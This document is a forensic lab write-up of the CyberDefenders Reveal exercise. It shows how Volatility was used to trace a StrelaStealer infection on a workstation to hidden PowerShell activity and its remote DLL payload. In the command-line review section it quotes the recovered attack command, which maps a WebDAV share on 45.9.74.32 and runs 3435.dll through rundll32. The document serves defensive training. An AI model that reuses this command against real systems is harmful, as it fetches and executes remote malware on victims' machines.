# Volatility Analysis: CyberDefenders Reveal

## Overview

This project documents my investigation of the CyberDefenders Reveal lab. The scenario involved a compromised workstation at a financial institution where a SIEM alert identified unusual activity on a system with access to sensitive financial data.

The investigation focused on analyzing a memory dump using Volatility to identify signs of compromise, trace the suspicious activity back to its source, determine the affected user, identify the malicious process, and map the behavior to MITRE ATT&CK.

## Video Walkthrough

[Watch my Volatility Analysis walkthrough on YouTube](https://www.youtube.com/watch?v=KssGsDv5ZOc)

## Scenario Summary

A financial institution received a SIEM alert for unusual workstation activity. Because the workstation had access to sensitive financial data, the incident required memory forensic analysis to determine whether the system was compromised.

A memory dump was collected from the suspected workstation and provided for investigation.

The analysis focused on:

* Identifying the malicious process
* Reviewing process hierarchy
* Finding the second stage payload
* Identifying the remote share used by the attacker
* Mapping the execution method to MITRE ATT&CK
* Identifying the compromised user
* Determining the malware family

## Objective

The objective of this investigation was to:

* Analyze a Windows memory dump with Volatility
* Identify suspicious processes in memory
* Determine the parent process ID of the malicious process
* Review command line activity
* Identify the second stage payload file
* Find the remote shared directory accessed by the malware
* Map the execution behavior to MITRE ATT&CK
* Identify the user account tied to the malicious process
* Enrich findings through malware intelligence
* Document the full investigation clearly

## Key Investigation Data

| Evidence Type | Finding |
|---|---|
| Lab platform | CyberDefenders |
| Lab name | Reveal |
| Category | Endpoint Forensics |
| Main tool | Volatility 3 |
| Memory image | `192-Reveal.dmp` |
| Malicious process | `powershell.exe` |
| Parent process ID | `4120` |
| Second stage payload | `3435.dll` |
| Remote shared directory | `davwwwroot` |
| Attacker IP address | `45.9.74.32` |
| MITRE sub technique | `T1218.011: Signed Binary Proxy Execution: Rundll32` |
| Compromised user | `Elon` |
| Malware family | `STRELASTEALER` |

## Skills Demonstrated

* Memory forensics
* Volatility analysis
* Windows process analysis
* Process hierarchy review
* Command line investigation
* Suspicious PowerShell analysis
* Remote share investigation
* Malware payload identification
* MITRE ATT&CK mapping
* User activity analysis
* Indicator enrichment
* Endpoint forensic reporting

## Tools and Evidence Used

* Volatility 3
* Kali Linux
* Memory dump analysis
* Process tree review
* Malfind review
* Command line extraction
* Strings analysis
* UserAssist analysis
* VirusTotal
* MITRE ATT&CK
* Endpoint forensic evidence

## Investigation Methodology

### 1. Memory Dump Identification

The investigation began by reviewing the memory image with Volatility.

The memory image analyzed was:

```text
192-Reveal.dmp
```

The goal was to identify suspicious activity that existed in memory at the time the dump was captured.

### 2. Process Tree Review

I reviewed running processes to understand process relationships and identify suspicious parent and child process activity.

Command used:

```bash
python3 vol.py -f 192-Reveal.dmp windows.pstree
```

This helped identify the process hierarchy and locate suspicious activity tied to PowerShell.

### 3. Malicious Process Identification

I used Volatility to search for suspicious injected or abnormal process memory.

Command used:

```bash
python3 vol.py -f 192-Reveal.dmp windows.malfind
```

The malicious process identified was:

```text
powershell.exe
```

PowerShell was suspicious because it appeared tied to hidden execution behavior and follow on payload activity.

### 4. Parent Process Identification

The parent process ID was identified by reviewing the process tree output.

The parent process ID was:

```text
4120
```

Identifying the parent process helped trace how the suspicious PowerShell process was launched and supported the attack flow.

### 5. Command Line Review

I reviewed the command line arguments tied to the suspicious process.

Command used:

```bash
python3 vol.py -f 192-Reveal.dmp windows.cmdline --pid 3692
```

The command line revealed that PowerShell was used to access a remote WebDAV style path and execute a DLL payload.

Observed command pattern:

```text
powershell.exe -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
```

This command was important because it showed hidden PowerShell activity, a remote shared directory, and execution of a DLL payload through Rundll32.

### 6. Second Stage Payload Identification

The command line activity revealed the second stage payload file.

Payload file:

```text
3435.dll
```

This DLL was executed from the remote shared path and was a key artifact in the attack chain.

### 7. Remote Shared Directory Review

The command line and memory strings revealed the shared directory accessed on the remote server.

Shared directory:

```text
davwwwroot
```

Attacker IP address:

```text
45.9.74.32
```

I also used strings analysis to confirm memory references related to the attacker IP address.

Example command:

```bash
strings 192-Reveal.dmp | grep 45.9.74.32
```

This helped validate that the IP address and remote share were present in memory.

### 8. MITRE ATT&CK Mapping

The malware used Rundll32 to execute a DLL from a remote location.

This behavior mapped to:

```text
T1218.011: Signed Binary Proxy Execution: Rundll32
```

This technique is commonly associated with abusing a trusted Windows binary to proxy execution of malicious code.

### 9. Compromised User Identification

The investigation also required identifying which user account was associated with the malicious process.

The compromised user identified was:

```text
Elon
```

User activity was reviewed with Volatility plugins such as UserAssist or session related analysis to connect process activity back to the affected account.

Example command:

```bash
python3 vol.py -f 192-Reveal.dmp windows.userassist
```

### 10. Malware Family Identification

To identify the malware family, the attacker IP address and related payload indicators were enriched using threat intelligence.

The malware family identified was:

```text
STRELASTEALER
```

This helped connect the observed memory artifacts to a known malware family and supported the incident classification.

## MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|---|---|---|
| Execution | PowerShell | Suspicious hidden PowerShell command executed on the host |
| Defense Evasion | `T1218.011: Signed Binary Proxy Execution: Rundll32` | Rundll32 was used to execute `3435.dll` from a remote share |
| Discovery | Process and system activity | Memory analysis revealed suspicious process behavior and user context |
| Command and Control | Remote share access | Host accessed `\\45.9.74.32@8888\davwwwroot\` |
| Credential or Data Theft Concern | Info stealer activity | Malware family identified as `STRELASTEALER` |

## Attack Timeline

| Phase | Activity |
|---|---|
| SIEM alert | Unusual activity detected on a workstation with access to sensitive financial data |
| Memory capture | Memory dump collected from the suspected workstation |
| Process review | `powershell.exe` identified as suspicious |
| Parent tracing | Parent process ID identified as `4120` |
| Command review | Hidden PowerShell command showed remote share access |
| Payload execution | `3435.dll` executed through Rundll32 |
| Remote access | Shared directory `davwwwroot` accessed through `45.9.74.32` |
| User identification | Malicious activity tied to user `Elon` |
| Malware enrichment | Malware family identified as `STRELASTEALER` |

## Key Findings

The investigation found that:

* The malicious process was `powershell.exe`
* The parent process ID was `4120`
* The second stage payload was `3435.dll`
* The malware accessed a remote shared directory named `davwwwroot`
* The attacker IP address was `45.9.74.32`
* The malware used Rundll32 to execute a DLL payload
* The behavior mapped to `T1218.011`
* The malicious process ran under the user `Elon`
* Threat intelligence identified the malware family as `STRELASTEALER`

## Defensive Lessons Learned

This lab reinforced several important defensive lessons:

* Memory analysis can reveal malicious activity not easily visible on disk
* PowerShell execution should be reviewed carefully during endpoint investigations
* Parent process ID analysis helps explain how malicious activity started
* Command line artifacts are critical during memory forensics
* Remote DLL execution is a serious indicator of compromise
* Rundll32 abuse should be monitored as a defense evasion technique
* Remote WebDAV style access can support payload staging
* User context helps determine the scope and impact of compromise
* Threat intelligence enrichment helps connect artifacts to known malware families

## Recommended Defensive Actions

Based on this investigation, recommended actions would include:

* Isolate the affected workstation
* Preserve memory and disk evidence
* Review PowerShell logs for related activity
* Hunt for `3435.dll` across endpoints
* Block communication to `45.9.74.32`
* Review network logs for access to `davwwwroot`
* Alert on suspicious Rundll32 execution from remote paths
* Alert on hidden PowerShell execution
* Review user account `Elon` for suspicious activity
* Reset affected user credentials
* Revoke active sessions for the affected user
* Search for indicators linked to `STRELASTEALER`
* Review SIEM rules for PowerShell and Rundll32 abuse

## What This Project Demonstrates

This project demonstrates my ability to:

* Analyze a Windows memory dump using Volatility
* Identify malicious processes in memory
* Trace process hierarchy using parent process IDs
* Review command line artifacts
* Identify second stage payload execution
* Investigate remote shared directory access
* Map malicious behavior to MITRE ATT&CK
* Identify the affected user account
* Enrich indicators with threat intelligence
* Translate forensic findings into defensive recommendations

## Disclosure Notice

This writeup is based on an authorized CyberDefenders training environment. It is intended to document the investigation process, lab indicators, and defensive concepts learned.

This page does not include private customer data, employer data, production system information, or unauthorized activity.
